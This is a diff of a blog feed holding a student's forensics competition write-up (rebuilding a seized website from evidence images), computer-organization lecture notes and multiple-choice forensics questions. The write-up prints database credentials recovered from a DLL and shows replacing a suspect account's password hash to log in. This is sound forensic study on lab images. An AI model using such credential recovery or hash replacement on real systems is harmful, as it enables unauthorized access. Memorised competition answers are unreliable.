-<h1 id="网站重构"><a href="#网站重构" class="headerlink" title="网站重构"></a>网站重构</h1><h2 id="系统登陆问题"><a href="#系统登陆问题" class="headerlink" title="系统登陆问题"></a>系统登陆问题</h2><p>我在做题的时候对检材三使用火眼仿真创建虚拟机失败，但得知Administrator账户为空密码，故转用Vm虚拟机打开，使用空密码登陆时要求用户重设密码，但多次设置均显示密码强度不够，一番尝试后发现 <code>./123ASD</code>  可以，并成功登录系统。</p>
-<h2 id="找到部署的网站信息"><a href="#找到部署的网站信息" class="headerlink" title="找到部署的网站信息"></a>找到部署的网站信息</h2><h3 id="对应例题-6"><a href="#对应例题-6" class="headerlink" title="对应例题"></a>对应例题</h3><p>32、检材 3 中，部署的网站名称是（）</p>
-<p>33、检材 3 中，部署的网站对应的网站根目录是（）</p>
-<p>34、检材 3 中，部署的网站绑定的端口是（）</p>
-<p>35、检材 3 中，具备登陆功能的代码页，对应的文件名为（）</p>
-<p>36、检材 3 中，请对网站代码进行分析，网站登录过程中，代码中对输入的明文密码 作了追加（）字符串处理 </p>
-<p>37、检材 3 中，请对网站代码进行分析，网站登录过程中，代码中调用的动态扩展库 文件的完整名称为（）</p>
-<p>38、检材 3 中，网站登录过程中，后台接收到明文密码后进行加密处理，首先使用的 算法是 Encryption 中的（）函数</p>
-<p>39、检材 3 中，分析该网站连接的数据库地址为（）</p>
-<p>40、检材 3 中，网站连接数据库使用的密码为（）（不会！！！！！）</p>
-<p>41、检材 3 中，网站连接数据库服务器的端口是（）</p>
-<h3 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h3><p>找到 开始 -&gt; 管理工具 -&gt; Internet 信息服务（IIS）管理器 打开</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211023120842632.png" alt="image-20211023120842632"></p>
-<p>选中 网站 -&gt; card -&gt; 高级设置 里面可以查看 <strong>网站根目录</strong> 和 <strong>绑定的端口</strong> </p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211023121052964.png" alt="image-20211023121052964"></p>
-<p>我们进入网站的根目录，下面找到网站的配置文件web.config ，打开后发现具备登录功能的代码页（login）</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211023121520019.png" alt="image-20211023121520019"></p>
-<p>打开后发现有行代码为 x.value+=’0v0’ 故可获得答案</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211023121646330.png" alt="image-20211023121646330"></p>
-<p>顺便找到了动态拓展库</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211023122030821.png" alt="image-20211023122030821"></p>
-<p>紧接上题，我们在根目录的 bin 文件夹打开上述的动态拓展库，</p>
-<p>仅仅是文本打开，并且靠运气找到加密函数（我也不信）</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211023123317933.png" alt="image-20211023123317933"></p>
-<p>一开始想法局限于VM虚拟机，想着怎样把文件拖出来到计算机里分析，后来才意识到取证大师可以导出虚拟机内的文件。。。，之后用dotPeek分析即可</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211023123923803.png" alt="image-20211023123923803"></p>
-<p>我也不知道为什么一定是DBManager.dll ，但是的确从里面找到了</p>
-<p>server=192.168.1.174、端口1433、uid=sa、pwd=31415926</p>
-<p>（密码用加密函数加密后表示为BASE64编码，需要继续研究，就先不深究了）</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211023124323866.png" alt="image-20211023124323866"></p>
-<h2 id="part4-（摘自大佬的WP，冲不下去了哭）"><a href="#part4-（摘自大佬的WP，冲不下去了哭）" class="headerlink" title="part4 （摘自大佬的WP，冲不下去了哭）"></a>part4 （摘自大佬的WP，冲不下去了哭）</h2><blockquote>
-<p>充满玄学的一部分</p>
-<p>向天高呼保佑,有几率进入下一步</p>
-</blockquote>
-<h3 id="设置检材4的数据库"><a href="#设置检材4的数据库" class="headerlink" title="设置检材4的数据库"></a>设置检材4的数据库</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 启动docker服务</span><br><span class="line">systemctl start docker</span><br><span class="line">// 列出所有在运行的容器信息</span><br><span class="line">docker ps // 没东西,说明没启动,需要自己启动一下</span><br><span class="line">// 显示所有的容器，包括未运行的</span><br><span class="line">docker ps -a</span><br><span class="line">// 启动docker里面的容器</span><br><span class="line">docker start 3f</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127125042696.png" alt="img/image-20201127125042696"></p>
-<p>从<strong>part3</strong>连接数据库部分可以得知,我们的数据库ip是<code>192.168.1.174</code></p>
-<p>所以关闭该虚拟机的DHCP服务</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127125519549.png" alt="img/image-20201127125519549"></p>
-<p>编辑下述文件修改静态ip</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/sysconfig/network-scripts/ifcfg-eth数字</span><br></pre></td></tr></table></figure>
-
-<p>修改/添加内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BOOTPROTO=&quot;static&quot; #dhcp改为static </span><br><span class="line">ONBOOT=&quot;yes&quot; #开机启用本配置</span><br><span class="line">IPADDR=192.168.1.174 #静态IP</span><br><span class="line">GATEWAY=192.168.1.1 #默认网关</span><br><span class="line">NETMASK=255.255.255.0 #子网掩码</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127125931153.png" alt="img/image-20201127125931153"></p>
-<p>重启网络服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service network restart</span><br></pre></td></tr></table></figure>
-
-<p>这步失败了,改了好久都不能重启服务成功,干脆直接重启虚拟机了</p>
-<p>结果意外好了&gt;&lt;</p>
-<p>查看ip</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure>
-
-<p>像下图这样就说明静态ip设置成功了</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127133110453.png" alt="img/image-20201127133110453"></p>
-<h3 id="设置检材3的服务器"><a href="#设置检材3的服务器" class="headerlink" title="设置检材3的服务器"></a>设置检材3的服务器</h3><p>网络配置使其与检材4位于同一网段,开启DHCP服务,使其可以ping通</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127133622279.png" alt="img/image-20201127133622279"></p>
-<p>网页进入<code>ip/dl</code>,即可看到重构的网页</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127140235443.png" alt="img/image-20201127140235443"></p>
-<h3 id="主机"><a href="#主机" class="headerlink" title="主机"></a>主机</h3><ol>
-<li><p>连接数据库</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127143808886.png" alt="img/image-20201127143808886"></p>
-<p>从检材PC可知,嫌疑人使用的用户是 <strong>liwente1314520</strong></p>
-</li>
-</ol>
-<ol start="2">
-<li><p>在<strong>TD_User表</strong>中将其密码改为123456</p>
-<ul>
-<li><p>逆向dll时,可知存在数据库里的密码经过如下处理</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符串拼接: &quot;密码&quot;+&quot;OvO&quot;</span><br><span class="line">加密: 使用DBManager.dll中的加密方法加密</span><br><span class="line">md5: 加密后计算md5值,并存入数据库</span><br></pre></td></tr></table></figure></li>
-<li><p>下图进行拼接和加密</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127144737619.png" alt="img/image-20201127144737619"></p>
-</li>
-<li><p>下图md5计算</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127144814666.png" alt="img/image-20201127144814666"></p>
-</li>
-<li><p>下图修改表中的值</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127145245384.png" alt="img/image-20201127145245384"></p>
-</li>
-</ul>
-</li>
-</ol>
-<ol start="3">
-<li><p>将服务器现在的ip添加到<strong>TD_Webs</strong>中</p>
-<p>同样是从dll逆向出来得知,执行登录操作时会检测域名</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127145103070.png" alt="img/image-20201127145103070"></p>
-</li>
-</ol>
-<h3 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h3><ul>
-<li><p>检材3</p>
-<p>cmd–services.msc   (本地服务设置)</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127145625474.png" alt="img/image-20201127145625474"></p>
-</li>
-<li><p>检材4</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker restart 容器id</span><br></pre></td></tr></table></figure>
-
-<p>然后就可以用 <strong>liwente1314520</strong> <strong>123456</strong> 登录网站了</p>
-</li>
-</ul>
-<h3 id="42-的原始磁盘-SHA256"><a href="#42-的原始磁盘-SHA256" class="headerlink" title="42.的原始磁盘 SHA256"></a>42.的原始磁盘 SHA256</h3><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201126195142183.png" alt="img/image-20201126195142183"></p>
-<h3 id="43-嫌疑用户的推广链接中参数里包含的-ID-是"><a href="#43-嫌疑用户的推广链接中参数里包含的-ID-是" class="headerlink" title="43.嫌疑用户的推广链接中参数里包含的 ID 是"></a>43.嫌疑用户的推广链接中参数里包含的 ID 是</h3><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127151654651.png" alt="img/image-20201127151654651"></p>
-<h3 id="44-该网站后台的代理用户数量"><a href="#44-该网站后台的代理用户数量" class="headerlink" title="44.该网站后台的代理用户数量"></a>44.该网站后台的代理用户数量</h3><p>统计一下个数即可</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127151811242.png" alt="img/image-20201127151811242"></p>
-<h3 id="45-该网站注册用户中共有过几个代理"><a href="#45-该网站注册用户中共有过几个代理" class="headerlink" title="45.该网站注册用户中共有过几个代理"></a>45.该网站注册用户中共有过几个代理</h3><p>上题中的用户数是未删除的个数,注册过的也就包括了之前注册,但是删掉了的用户数</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127151905956.png" alt="img/image-20201127151905956"></p>
-<h3 id="46-2019-年-10-月-1-日后补发成功的金额总值"><a href="#46-2019-年-10-月-1-日后补发成功的金额总值" class="headerlink" title="46.2019 年 10 月 1 日后补发成功的金额总值"></a>46.2019 年 10 月 1 日后补发成功的金额总值</h3><p>数量略多,需要导出,使用excel或其他软件处理计算</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127152103903.png" alt="img/image-20201127152103903"></p>
-<h3 id="47-对“TX-IpLog”表进行分析，所有在“武汉市”登录的次数为"><a href="#47-对“TX-IpLog”表进行分析，所有在“武汉市”登录的次数为" class="headerlink" title="47.对“TX_IpLog”表进行分析，所有在“武汉市”登录的次数为"></a>47.对“TX_IpLog”表进行分析，所有在“武汉市”登录的次数为</h3><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127152253898.png" alt="img/image-20201127152253898"></p>
-<h3 id="48-该嫌疑人下属代理“liyun10”账户下的余额有多少元"><a href="#48-该嫌疑人下属代理“liyun10”账户下的余额有多少元" class="headerlink" title="48.该嫌疑人下属代理“liyun10”账户下的余额有多少元"></a>48.该嫌疑人下属代理“liyun10”账户下的余额有多少元</h3><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127152510630.png" alt="img/image-20201127152510630"></p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127152550329.png" alt="img/image-20201127152550329"></p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127152634952.png" alt="img/image-20201127152634952"></p>
-<h3 id="49-接上题-该用户的推广-ID-是"><a href="#49-接上题-该用户的推广-ID-是" class="headerlink" title="49.接上题,该用户的推广 ID 是"></a>49.接上题,该用户的推广 ID 是</h3><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127152724022.png" alt="img/image-20201127152724022"></p>
-<h3 id="50-接上题，该代理商户的最后一次登陆时间是"><a href="#50-接上题，该代理商户的最后一次登陆时间是" class="headerlink" title="50.接上题，该代理商户的最后一次登陆时间是"></a>50.接上题，该代理商户的最后一次登陆时间是</h3><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127152827440.png" alt="img/image-20201127152827440"></p>
-<h1 id="疑难杂症"><a href="#疑难杂症" class="headerlink" title="疑难杂症"></a>疑难杂症</h1><p>16、接 15 题，该端口上运行的进程的程序名称（Program name）为（） （答案格式：“avahi-deamon” 字母和半角符号组合）</p>
-<p>22、上述交易中，嫌疑人和供应商的交易时间是（） （答案格式：“2020-01-01 21:35:54” 精确到秒，半角符号</p>
-<p>23、上述交易中，嫌疑人支付货币的数量为（） （答案格式：“8888” 纯数字</p>
-<p>28、检材 2 中，嫌疑人使用了（）远程管理工具，登录了检材 1 所在的服务</p>
-<p>29、检材 2 中，嫌疑人使用上述工具连接服务器时，使用的登录密码为（） （答案格式：“aBcd#123”</p>
-]]></content>
-      <tags>
-        <tag>电子数据取证</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>计算机组成与结构体系</title>
-    <url>/2022/01/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B8%8E%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
-    <content><![CDATA[<h1 id="计算机组成与结构体系"><a href="#计算机组成与结构体系" class="headerlink" title="计算机组成与结构体系"></a>计算机组成与结构体系</h1><h2 id="第一次课"><a href="#第一次课" class="headerlink" title="第一次课"></a>第一次课</h2><h3 id="教学大纲"><a href="#教学大纲" class="headerlink" title="教学大纲"></a>教学大纲</h3><p>本课程为计算机专业的专业基础课。课程主要讲述计算机系统主要部件的基本组成及其结构，通过指令的执行过程来掌握计算机系统的工作原理，内容包括：<strong>数据的编码表示、运算方法和运算器组成、指令系统、存储体系、控制器基本原理、系统总线及输入输出系统</strong>。</p>
-<h3 id="教学目录"><a href="#教学目录" class="headerlink" title="教学目录"></a>教学目录</h3><p><img src="/2022/01/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B8%8E%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20220113011814891.png" alt="image-20220113011814891"></p>
-<p>从1946年计算机诞生以来,大约每隔五年运算速度提高10倍,可靠性提高10倍,成本降低10倍,体积缩小10倍。</p>
-<h4 id="数字计算机的组成"><a href="#数字计算机的组成" class="headerlink" title="数字计算机的组成"></a>数字计算机的组成</h4><p><img src="/2022/01/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B8%8E%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20220113012552446.png" alt="image-20220113012552446"></p>
-<h5 id="运算器"><a href="#运算器" class="headerlink" title="运算器"></a>运算器</h5><p>主要功能是进行加、减、乘、除等算术运算,还可进行逻辑运算。</p>
-<p>在运算中，当数的位数越多时，计算的精度就越高。理论上讲，数的位数可以任意多。但是位数越多,所需的电子器件也越多</p>
-<h5 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h5><blockquote>
-<p>磁盘存储器和光盘存储器，称为外存储器。相对而言，半导体存储器称为内存储器，简称内存。</p>
-</blockquote>
-<p>一个半导体触发器由于有0和1两个状态，可以记忆一个二进制代码。</p>
-<p>一个数假定用16位二进制代码表示,那么就需要有16个触发器来保存这些代码。</p>
-<p>通常，在存储器中保存一个数的16个触发器，称为<strong>一个存储单元</strong>。存储器是由许多存储单元组成。</p>
-<p>每个存储单元的编号，称为<strong>地址</strong>。向存储器中存数或者从存储器中取数，都要按给定的地址来寻找所选的存储单元。</p>
-<p>存储器<strong>所有存储单元的总数</strong>成为存储器的存储容量。通常用单位“KB、MB”表示。</p>
-<h5 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h5><p>控制器的任务是从内存中取出解题步骤加以分析，然后执行某种操作。</p>
-<p>运算器只能完成加、减、乘、除四则运算及其他一些辅助操作。对于比较复杂的算题，计算机在运算前必须化成一步一步简单的加、减、乘、除等基本操作来做。</p>
-<p>每一个基本操作就叫做<strong>一条指令</strong>，而解算某一问题的一串指令序列，叫做该问题的<strong>计算程序</strong>，简称为程序。</p>
-<h5 id="输入输出设备"><a href="#输入输出设备" class="headerlink" title="输入输出设备"></a>输入输出设备</h5><p>计算机的输入/输出设备通常称为<strong>外围设备</strong>。</p>
-<p>这些外围设备有高速的也有低速的，有机电结构的，也有全电子式的。由于种类繁多且速度各异,因而它们不是直接地同高速工作的主机相连接,而是通过<strong>适配器部件</strong>与主机相连接。</p>
-<p>适配器的作用相当与一个转换器。它可以保证外围设备用计算机系统特性所要求的形式发送或接受信息。 </p>
-<h4 id="典型PC机构成"><a href="#典型PC机构成" class="headerlink" title="典型PC机构成"></a>典型PC机构成</h4><p><img src="/2022/01/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B8%8E%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20220113013814708.png" alt="image-20220113013814708"></p>
-<h4 id="冯-诺依曼计算机"><a href="#冯-诺依曼计算机" class="headerlink" title="冯.诺依曼计算机"></a>冯.诺依曼计算机</h4><h5 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h5><p>将计算机要处理的问题用指令编成程序，并将程序存放在存储器中，在控制器的控制下，从存储器中逐条取出指令并执行，通过执行程序最终解决计算机问题。</p>
-<h5 id="基本特点"><a href="#基本特点" class="headerlink" title="基本特点"></a>基本特点</h5><ul>
-<li>计算机组成：运算器、存储器、控制器、输入设备和输出设备</li>
-<li>指令和数据以二进制形式表示，按地址访问存储</li>
-<li>指令=操作码+地址码</li>
-<li>指令编成程序</li>
-<li>在控制器控制下，指令被逐条（顺序）从存储器中取出来执行，产生控制流，在控制流驱动下完成指令的功能</li>
-<li>可由跳转或者设定的条件改变程序中指令的执行顺序</li>
-<li>以运算器为中心，输入输出设备通过运算器与存储器传送数据</li>
-</ul>
-<h5 id="硬件结构发展"><a href="#硬件结构发展" class="headerlink" title="硬件结构发展"></a>硬件结构发展</h5><ul>
-<li>不断扩充硬件及功能</li>
-<li>存储器分层</li>
-<li>总线结构</li>
-</ul>
-<h4 id="计算机软件"><a href="#计算机软件" class="headerlink" title="计算机软件"></a>计算机软件</h4><h5 id="系统软件"><a href="#系统软件" class="headerlink" title="系统软件"></a>系统软件</h5><p>系统软件用来<strong>简化程序设计</strong>，简化使用方法，<strong>提高计算机的使用效率</strong>，发挥和扩大计算机的功能及用途。</p>
-<ul>
-<li>各种服务性程序,如诊断程序排错程序练习程序等</li>
-<li>语言程序,如汇编程序编译程序解释程序</li>
-<li>操作系统</li>
-<li>通用程序及数据库管理系统</li>
-</ul>
-<h5 id="应用软件"><a href="#应用软件" class="headerlink" title="应用软件"></a>应用软件</h5><p>应用软件是用户利用计算机来<strong>解决某些问题所编制的程序</strong>,如工程设计程序、数据处理程序、自动控制程序、企业管理程序、情报检索程序、科学计算程序等等。随着计算机的广泛应用,这类程序的种类越来越多。</p>
-<h4 id="指令集体系结构（ISA）"><a href="#指令集体系结构（ISA）" class="headerlink" title="指令集体系结构（ISA）"></a>指令集体系结构（ISA）</h4><p>处理器支持的指令和指令的字节级编码称为指令集体系结构（Instruction-Set Architecture，ISA），是软件和硬件的分界面.</p>
-<h5 id="涵盖的方面"><a href="#涵盖的方面" class="headerlink" title="涵盖的方面"></a>涵盖的方面</h5><ul>
-<li>指令集<ul>
-<li>指令格式、操作种类以及对应的操作数规定</li>
-<li>数据类型</li>
-<li>寻址方式</li>
-</ul>
-</li>
-<li>软件可见的处理器状态<ul>
-<li>寄存器属性</li>
-<li>指令执行过程的控制方式</li>
-</ul>
-</li>
-<li>存储模型<ul>
-<li>主存组织</li>
-<li>字节次序</li>
-<li>存储保护</li>
-<li>虚拟存储器的管理方式</li>
-<li>输入输出接口的访问与管理</li>
-</ul>
-</li>
-<li>系统模型<ul>
-<li>处理器状态</li>
-<li>特权级别</li>
-<li>中断和异常的处理方式</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="Flynn分类法"><a href="#Flynn分类法" class="headerlink" title="Flynn分类法"></a>Flynn分类法</h2><p>数据流（DS）<br>指令流所使用的数据，包括输入数据、中间数据和结果。数据在处理单元（PU）中进行处理。<br>指令流（IS）<br>机器执行的指令序列，由存储器流入控制单元（CU）。<br>控制流（CS）<br>指令流进入CU，由CU产生一系列控制流（信号），在控制流的控制下完成指令的功能。</p>
-<p>单指令流单数据流SISD<br>Single Instruction Single Data<br>单指令流多数据流SIMD<br> Single Instruction Multiple Data<br>多指令流单数据流MISD<br>Multiple Instructions Single Data<br>多指令流多数据流MIMD<br>Multiple Instructions Multiple Data</p>
-<p><img src="/2022/01/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B8%8E%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20220421193526313.png" alt="image-20220421193526313"></p>
-]]></content>
-      <tags>
-        <tag>计科课程</tag>
       </tags>
   </entry>
   <entry>
@@ -2433,10 +2270,10 @@
 <p>D:File List\User File List\Applications/Group/group.net.WhatsApp.shared/ChatStorage.sqlite Table:ZWAMESSAGE(ZCHATSESSION:4) </p>
 <p>E: List\Temp File List\Applications/Chat/group.net.WhatsApp.share/ChatStorage.sqlite Table:SESSION:4) </p>
 <p>答案：</p>
-<h3 id="47、Bob的iPhone的苹果ID是甚么？"><a href="#47、Bob的iPhone的苹果ID是甚么？" class="headerlink" title="47、Bob的iPhone的苹果ID是甚么？"></a>47、Bob的iPhone的苹果ID是甚么？</h3><p>A:<a href="mailto:&#x62;&#x6f;&#x62;&#x63;&#x68;&#x65;&#x75;&#110;&#x67;&#x31;&#50;&#51;&#64;&#103;&#109;&#97;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;">&#x62;&#x6f;&#x62;&#x63;&#x68;&#x65;&#x75;&#110;&#x67;&#x31;&#50;&#51;&#64;&#103;&#109;&#97;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;</a> </p>
-<p>B:<a href="mailto:&#x62;&#111;&#98;&#99;&#x68;&#101;&#x75;&#110;&#103;&#64;&#121;&#97;&#104;&#111;&#111;&#x2e;&#x63;&#x6f;&#x6d;">&#x62;&#111;&#98;&#99;&#x68;&#101;&#x75;&#110;&#103;&#64;&#121;&#97;&#104;&#111;&#111;&#x2e;&#x63;&#x6f;&#x6d;</a> </p>
-<p>C:<a href="mailto:&#98;&#111;&#98;&#99;&#x68;&#x65;&#117;&#x6e;&#x67;&#x40;&#x67;&#x6d;&#x61;&#105;&#x6c;&#46;&#99;&#x6f;&#109;">&#98;&#111;&#98;&#99;&#x68;&#x65;&#117;&#x6e;&#x67;&#x40;&#x67;&#x6d;&#x61;&#105;&#x6c;&#46;&#99;&#x6f;&#109;</a> </p>
-<p>D:<a href="mailto:&#x62;&#111;&#98;&#50;&#51;&#64;&#x67;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#109;">&#x62;&#111;&#98;&#50;&#51;&#64;&#x67;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#109;</a> </p>
+<h3 id="47、Bob的iPhone的苹果ID是甚么？"><a href="#47、Bob的iPhone的苹果ID是甚么？" class="headerlink" title="47、Bob的iPhone的苹果ID是甚么？"></a>47、Bob的iPhone的苹果ID是甚么？</h3><p>A:<a href="mailto:&#98;&#111;&#98;&#99;&#104;&#x65;&#117;&#110;&#103;&#x31;&#x32;&#x33;&#x40;&#103;&#109;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;">&#98;&#111;&#98;&#99;&#104;&#x65;&#117;&#110;&#103;&#x31;&#x32;&#x33;&#x40;&#103;&#109;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;</a> </p>
+<p>B:<a href="mailto:&#98;&#111;&#x62;&#x63;&#104;&#101;&#x75;&#x6e;&#103;&#64;&#121;&#97;&#104;&#111;&#111;&#x2e;&#99;&#111;&#x6d;">&#98;&#111;&#x62;&#x63;&#104;&#101;&#x75;&#x6e;&#103;&#64;&#121;&#97;&#104;&#111;&#111;&#x2e;&#99;&#111;&#x6d;</a> </p>
+<p>C:<a href="mailto:&#98;&#111;&#x62;&#x63;&#x68;&#x65;&#x75;&#x6e;&#x67;&#x40;&#103;&#x6d;&#97;&#105;&#108;&#x2e;&#99;&#111;&#109;">&#98;&#111;&#x62;&#x63;&#x68;&#x65;&#x75;&#x6e;&#x67;&#x40;&#103;&#x6d;&#97;&#105;&#108;&#x2e;&#99;&#111;&#109;</a> </p>
+<p>D:<a href="mailto:&#98;&#x6f;&#98;&#50;&#51;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#98;&#x6f;&#98;&#50;&#51;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;</a> </p>
 <p>E:bobcheung123@hotmaillcom </p>
 <p>答案：</p>
 <h3 id="48、Bob的iPhone的IMEI是甚么？"><a href="#48、Bob的iPhone的IMEI是甚么？" class="headerlink" title="48、Bob的iPhone的IMEI是甚么？"></a>48、Bob的iPhone的IMEI是甚么？</h3><p>A:13421004458835    B:23421224458835    C:144410044508835    D:934218004458888    E:23421084450035 </p>
@@ -2444,13 +2281,13 @@
 <h3 id="49、Bob-iPhone的时区设置是甚么？"><a href="#49、Bob-iPhone的时区设置是甚么？" class="headerlink" title="49、Bob iPhone的时区设置是甚么？"></a>49、Bob iPhone的时区设置是甚么？</h3><p>A:UTC +8    B:UTC +0    C:UTC -8    D:UTC -10    E:UTC + 6 </p>
 <p>答案：</p>
 <h3 id="50、文件“-VIP-txt”的完整路径是甚么？"><a href="#50、文件“-VIP-txt”的完整路径是甚么？" class="headerlink" title="50、文件“ VIP.txt”的完整路径是甚么？"></a>50、文件“ VIP.txt”的完整路径是甚么？</h3><p>A:Bob/mobile/DCIM/Shared/AppGroup/group.whatsapp.WhatsApp.shared /Message/Media//5/c56255d0-a407-4341-afef-7bf5accc52f0.txt </p>
